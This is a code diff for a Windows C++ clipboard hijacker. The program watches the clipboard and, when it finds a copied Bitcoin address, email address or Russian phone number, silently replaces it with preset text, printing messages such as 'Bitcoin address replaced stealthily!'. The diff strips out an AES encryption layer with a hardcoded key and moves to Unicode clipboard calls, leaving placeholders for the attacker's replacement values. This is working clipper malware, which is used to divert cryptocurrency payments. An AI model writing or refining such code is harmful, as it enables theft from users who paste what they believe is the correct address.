@@ -6,51 +6,8 @@
 #include <chrono>
 #include <vector>
 #include <random>
-#include <openssl/aes.h>
-#include <openssl/rand.h>
-#include <codecvt>
-#include <locale>
 
-// AES key for encryption (replace with your secure key)
-unsigned char aesKey[32] = "01234567890123450123456789012345"; // Using a 256-bit key
-
-// Function for AES encryption
-std::string EncryptAES(const std::string& text) {
-    AES_KEY encryptKey;
-    AES_set_encrypt_key(aesKey, 256, &encryptKey);
-
-    std::string encryptedText;
-    encryptedText.resize(text.size() + AES_BLOCK_SIZE);
-
-    unsigned char ivec[AES_BLOCK_SIZE] = { 0 };
-    int num = 0;
-    AES_cfb128_encrypt((const unsigned char*)text.c_str(), (unsigned char*)encryptedText.data(), text.size(), &encryptKey, ivec, &num, AES_ENCRYPT);
-
-    return encryptedText;
-}
-
-// Function for AES decryption
-std::string DecryptAES(const std::string& encryptedText) {
-    AES_KEY decryptKey;
-    AES_set_decrypt_key(aesKey, 256, &decryptKey);
-
-    std::string decryptedText;
-    decryptedText.resize(encryptedText.size());
-
-    unsigned char ivec[AES_BLOCK_SIZE] = { 0 };
-    int num = 0;
-    AES_cfb128_encrypt((const unsigned char*)encryptedText.c_str(), (unsigned char*)decryptedText.data(), encryptedText.size(), &decryptKey, ivec, &num, AES_DECRYPT);
-
-    return decryptedText;
-}
-
-// Function to check if text matches a given pattern
-bool MatchesPattern(const std::wstring& text, const std::wstring& pattern) {
-    std::wregex regex(pattern);
-    return std::regex_match(text, regex);
-}
-
-// Function to replace clipboard content with encrypted text
+// Function to replace clipboard content
 bool ReplaceClipboard(const std::wstring& newText) {
     if (!OpenClipboard(nullptr)) {
         std::cerr << "Failed to open clipboard" << std::endl;
@@ -59,10 +16,8 @@ bool ReplaceClipboard(const std::wstring& newText) {
 
     EmptyClipboard();
 
-    // Encrypt newText using AES
-    std::string encryptedText = EncryptAES(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(newText));
-
-    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (encryptedText.length() + 1) * sizeof(char));
+    // Allocate global memory for the new text
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (newText.length() + 1) * sizeof(wchar_t));
 
     if (hMem == nullptr) {
         CloseClipboard();
@@ -70,7 +25,7 @@ bool ReplaceClipboard(const std::wstring& newText) {
         return false;
     }
 
-    char* clipData = static_cast<char*>(GlobalLock(hMem));
+    wchar_t* clipData = static_cast<wchar_t*>(GlobalLock(hMem));
 
     if (clipData == nullptr) {
         GlobalFree(hMem);
@@ -79,11 +34,13 @@ bool ReplaceClipboard(const std::wstring& newText) {
         return false;
     }
 
-    strcpy_s(clipData, encryptedText.length() + 1, encryptedText.c_str());
+    // Copy the new text into the allocated memory
+    wcscpy_s(clipData, newText.length() + 1, newText.c_str());
 
     GlobalUnlock(hMem);
 
-    SetClipboardData(CF_TEXT, hMem);
+    // Set the new clipboard data
+    SetClipboardData(CF_UNICODETEXT, hMem);
 
     CloseClipboard();
     return true;
@@ -165,21 +122,20 @@ void MonitorClipboard() {
 
     while (true) {
         std::wstring clipboardText = GetClipboardContent();
-        
 
         if (!clipboardText.empty() && clipboardText != lastClipboardContent) {
-            if (MatchesPattern(clipboardText, L"^[13][a-zA-Z0-9]{25,34}$")) {
-                std::wstring replaceText = L"btc"; // Replace with text for Bitcoin address
+            if (std::regex_match(clipboardText, std::wregex(L"^[13][a-zA-Z0-9]{25,34}$"))) {
+                std::wstring replaceText = L"REPLACE_TEXT_FOR_BTC_ADDRESS"; // Replace with text for Bitcoin address
                 if (ReplaceClipboard(replaceText)) {
                     std::wcout << L"Bitcoin address replaced stealthily!" << std::endl;
                 }
-            } else if (MatchesPattern(clipboardText, L"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$")) {
-                std::wstring replaceText = L"mail"; // Replace with text for email address
+            } else if (std::regex_match(clipboardText, std::wregex(L"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"))) {
+                std::wstring replaceText = L"REPLACE_TEXT_FOR_EMAIL_ADDRESS"; // Replace with text for email address
                 if (ReplaceClipboard(replaceText)) {
                     std::wcout << L"Email address replaced stealthily!" << std::endl;
                 }
-            } else if (MatchesPattern(clipboardText, L"^\\+7\\d{10}$")) {
-                std::wstring replaceText = L"phone"; 
+            } else if (std::regex_match(clipboardText, std::wregex(L"^\\+7\\d{10}$"))) {
+                std::wstring replaceText = L"REPLACE_TEXT_FOR_PHONE_NUMBER"; 
                 if (ReplaceClipboard(replaceText)) {
                     std::wcout << L"Russian phone number replaced stealthily!" << std::endl;
                 }
